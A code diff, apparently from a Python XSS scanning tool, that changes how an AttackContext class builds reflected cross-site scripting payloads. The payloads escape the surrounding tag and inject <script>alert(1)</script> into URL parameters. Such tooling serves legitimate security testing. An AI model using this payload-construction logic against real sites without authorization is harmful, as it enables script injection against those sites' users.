@@ -100,7 +100,7 @@ class AttackContext:
                            ['script','script',False]])
 
         if self.is_js:
-            self.f.update({';':';'})
+            self.f.append([';',';',False])
             print 'JS_CONTEXT --set_target_chars'
     
     # Construct a fuzzing string to account for filtering
@@ -119,16 +119,17 @@ class AttackContext:
     def make_atk_str(self):
         # TODO Make sure the is_js scenario has a diferent output
         # Also tag attribute attack also needs different attack
-        delim    = self.f[0][1]
-        open_br  = self.f[1][1]
-        slash    = self.f[2][1]
-        close_br = self.f[3][1]
-        script   = self.f[4][1]
+        delim    = self.f[0][1] # ' or " or `
+        open_br  = self.f[1][1] # <
+        slash    = self.f[2][1] # /
+        close_br = self.f[3][1] # >
+        script   = self.f[4][1] # script
+        close    = ''           # </_tag_> or /> or blank
         if self.tag_closed:
-            print 'tag_closed'
-        else:
-            print 'tag_unclosed'
-        alert = open_br + script + close_br + 'alert(1)' +  \
+            close = open_br + slash + self.tag + close_br
+        else: 
+            close = slash + close_br
+        alert = close + open_br + script + close_br + 'alert(1)' +  \
                 open_br + slash + script + close_br
         ret = gen_urls(self.parent.parsed_url, alert, 
                        self.parent.param)
